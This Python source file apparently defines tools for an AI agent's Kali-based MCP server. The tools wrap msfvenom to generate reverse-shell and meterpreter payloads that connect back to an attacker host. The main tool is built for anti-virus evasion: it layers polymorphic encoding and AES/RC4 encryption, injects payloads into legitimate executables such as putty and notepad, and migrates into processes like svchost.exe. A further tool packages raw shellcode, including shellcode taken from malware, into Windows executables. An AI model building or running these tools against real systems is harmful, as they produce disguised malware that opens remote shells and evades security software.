import os
import tempfile
from mcp.types import Tool
from ..tools.base import run_tool

TOOLS = [
    Tool(
        name="evasive_payload",
        description=(
            "Advanced payload crafter for anti-virus evasion. Applies multiple evasion layers: "
            "polymorphic encoding (shikata_ga_nai, xor), encryption (AES256, RC4), "
            "template injection into legitimate executables (putty, plink), process migration on execution, "
            "bad character avoidance, and obfuscation padding. "
            "Use INSTEAD of msfvenom when AV evasion is needed. Use msfvenom for simple/standard payload generation. "
            "Output: saved payload file path with size, plus any msfvenom warnings about the chosen configuration."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "payload": {"type": "string", "description": "Payload name (e.g. 'windows/x64/meterpreter/reverse_tcp', 'windows/meterpreter/reverse_https')"},
                "lhost": {"type": "string", "description": "Listen host IP — where the payload connects back"},
                "lport": {"type": "string", "description": "Listen port — which port the payload connects to"},
                "fmt": {"type": "string", "description": "Output format. Default: exe. Options: exe, dll, python, c, powershell, raw, vba"},
                "encoder": {"type": "string", "description": "Encoder name or 'auto'. Auto picks best encoder per architecture (shikata_ga_nai for x86, xor for x64)"},
                "iterations": {"type": "integer", "description": "Encoding iterations for polymorphism (default: 5). Higher = better evasion but larger payload."},
                "encrypt": {"type": "string", "description": "Encryption layer: aes256, rc4, xor. Adds another layer of obfuscation."},
                "encrypt_key": {"type": "string", "description": "Custom encryption key. Random if not specified."},
                "template": {"type": "string", "description": "Template executable to inject into. Use 'putty', 'plink', 'notepad', or path to custom exe."},
                "inject_process": {"type": "string", "description": "Process to migrate into on execution (e.g. 'explorer.exe', 'svchost.exe')"},
                "platform": {"type": "string", "description": "Target platform: windows (default), linux, android"},
                "arch": {"type": "string", "description": "Target architecture: x86, x64 (default), armle"},
                "badchars": {"type": "string", "description": "Characters to avoid in shellcode (default: '\\x00'). Add '\\x0a\\x0d' for HTTP payloads."},
                "obfuscate": {"type": "boolean", "description": "Enable extra obfuscation padding to inflate encoder space and evade signature detection"},
                "opts": {"type": "string", "description": "Additional raw msfvenom options (e.g. '--smallest' for minimum size)"},
            },
            "required": ["payload", "lhost", "lport"],
        },
    ),
    Tool(
        name="list_payloads",
        description=(
            "List all available msfvenom payloads with descriptions. Use BEFORE generating a payload to find "
            "the correct payload name for your target platform and connection type. "
            "Filter by platform (windows, linux, android), architecture (x86, x64), or keyword (reverse_tcp, bind, meterpreter). "
            "Output: table of payload names with descriptions, organized by platform."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "platform": {"type": "string", "description": "Filter by platform: windows, linux, android, osx, solaris, bsd"},
                "arch": {"type": "string", "description": "Filter by architecture: x86, x64, armle, mipsle, ppc, aarch64"},
                "keyword": {"type": "string", "description": "Keyword to search within payload names (e.g. 'reverse_tcp', 'meterpreter', 'bind', 'https')"},
            },
            "required": [],
        },
    ),
    Tool(
        name="list_encoders",
        description=(
            "List all available msfvenom encoders with their ranks and descriptions. "
            "Use to find the best encoder for your target architecture. "
            "Filter by platform or architecture to see relevant encoders only. "
            "Output: table of encoder names with ranks (excellent, great, good, normal, manual) and descriptions."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "platform": {"type": "string", "description": "Filter by platform: windows, linux, android"},
                "arch": {"type": "string", "description": "Filter by architecture: x86, x64"},
            },
            "required": [],
        },
    ),
    Tool(
        name="list_encryption",
        description=(
            "List available msfvenom encryption/encoding formats (aes256, rc4, xor, base64, etc.). "
            "Use to see what encryption options are available for payload generation. "
            "Output: list of supported encryption methods."
        ),
        inputSchema={
            "type": "object",
            "properties": {},
            "required": [],
        },
    ),
    Tool(
        name="shellcode_to_exe",
        description=(
            "Convert raw shellcode from a file into a Windows executable. "
            "Use when you have shellcode from another source (Cobalt Strike, custom C code, or extracted from malware) "
            "and need to package it as an EXE for execution. "
            "Output: path to the generated executable file."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "shellcode_file": {"type": "string", "description": "Path to file containing raw shellcode bytes"},
                "arch": {"type": "string", "description": "Architecture of the shellcode: x86 (32-bit, default) or x64 (64-bit)"},
                "outfile": {"type": "string", "description": "Output executable path (default: auto-generated temp file)"},
            },
            "required": ["shellcode_file"],
        },
    ),
]

DISPATCH = {
    "evasive_payload": lambda **kw: craft_evasive_payload(**kw),
    "list_payloads": lambda **kw: list_payloads(**kw),
    "list_encoders": lambda **kw: list_encoders(**kw),
    "list_encryption": lambda **kw: list_encryption(**kw),
    "shellcode_to_exe": lambda **kw: shellcode_to_exe(**kw),
}


ENCODERS = {
    "x86": "x86/shikata_ga_nai",
    "x64": "x64/xor",
    "cmd": "cmd/powershell_base64",
    "python": "generic/none",
}

EVASION_TEMPLATES = {
    "putty": "/usr/share/windows-binaries/putty.exe",
    "plink": "/usr/share/windows-binaries/plink.exe",
    "notepad": "notepad.exe",
}


def craft_evasive_payload(
    payload: str,
    lhost: str,
    lport: str,
    fmt: str = "exe",
    encoder: str = "auto",
    iterations: int = 5,
    encrypt: str = "",
    encrypt_key: str = "",
    template: str = "",
    inject_process: str = "",
    platform: str = "",
    arch: str = "",
    badchars: str = "\\x00",
    obfuscate: bool = False,
    opts: str = "",
) -> str:
    if not payload or not lhost or not lport:
        return "payload, lhost, and lport are required"

    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}"]

    if fmt:
        cmd.extend(["-f", fmt])

    chosen_encoder = encoder
    if encoder == "auto":
        if "x64" in payload:
            chosen_encoder = ENCODERS["x64"]
        elif "x86" in payload or "windows" in payload:
            chosen_encoder = ENCODERS["x86"]
        elif "python" in payload:
            chosen_encoder = ENCODERS["python"]
        else:
            chosen_encoder = "generic/none"

    if chosen_encoder and chosen_encoder != "generic/none":
        cmd.extend(["-e", chosen_encoder])
        if iterations > 0:
            cmd.extend(["-i", str(max(iterations, 1))])

    if badchars:
        cmd.extend(["-b", badchars])

    if platform:
        cmd.extend(["--platform", platform])

    if arch:
        cmd.extend(["-a", arch])

    if template:
        if template in EVASION_TEMPLATES:
            template = EVASION_TEMPLATES[template]
        cmd.extend(["-x", template])

    if encrypt:
        cmd.extend(["--encrypt", encrypt])
        if encrypt_key:
            cmd.extend(["--encrypt-key", encrypt_key])

    if inject_process:
        cmd.extend(["--prepend-fork" if inject_process == "fork" else f"PrependMigrateProc={inject_process}"])

    if obfuscate:
        cmd.extend(["--encoder-space", "4096"])

    if opts:
        cmd.extend(opts.split())

    tmpdir = tempfile.mkdtemp(prefix="kali_mcp_")
    outpath = os.path.join(tmpdir, f"payload.{fmt}")
    cmd.extend(["-o", outpath])

    result = run_tool(cmd, timeout=180)
    file_info = ""
    if os.path.exists(outpath):
        size = os.path.getsize(outpath)
        file_info = f"\n[payload saved] {outpath} ({size} bytes)"

    return result + file_info


def list_payloads(platform: str = "", arch: str = "", keyword: str = "") -> str:
    cmd = ["msfvenom", "-l", "payloads"]
    if platform:
        cmd.extend(["--platform", platform])
    if arch:
        cmd.extend(["-a", arch])
    result = run_tool(cmd, timeout=30)
    if keyword:
        lines = result.split("\n")
        header = lines[:2]
        filtered = [l for l in lines[2:] if keyword.lower() in l.lower()]
        return "\n".join(header + filtered[:50])
    return result


def list_encoders(platform: str = "", arch: str = "") -> str:
    cmd = ["msfvenom", "-l", "encoders"]
    if platform:
        cmd.extend(["--platform", platform])
    if arch:
        cmd.extend(["-a", arch])
    return run_tool(cmd, timeout=30)


def list_encryption() -> str:
    return run_tool(["msfvenom", "-l", "encrypt"], timeout=30)


def shellcode_to_exe(shellcode_file: str, arch: str = "x86", outfile: str = "") -> str:
    if not shellcode_file:
        return "shellcode_file is required"
    cmd = ["msfvenom", "-p", "generic/custom", f"PAYLOADFILE={shellcode_file}", "-a", arch, "--platform", "windows", "-f", "exe"]
    if outfile:
        cmd.extend(["-o", outfile])
    return run_tool(cmd, timeout=60)
